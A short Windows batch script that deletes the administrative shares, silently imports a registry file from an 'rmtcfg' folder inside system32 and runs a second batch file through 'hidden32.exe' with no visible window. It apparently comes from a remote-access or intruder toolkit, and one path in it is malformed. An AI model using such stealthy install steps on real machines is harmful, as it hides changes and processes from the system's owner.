@echo off

cd c:
net share /delete C$ /y
net share /delete ADMIN$ /y
net share /delete IPC$ /y

c:
cd c:\C:\WINNT\system32\rmtcfg
REGEDIT /S regkeyadd.REG

hidden32.exe secure.bat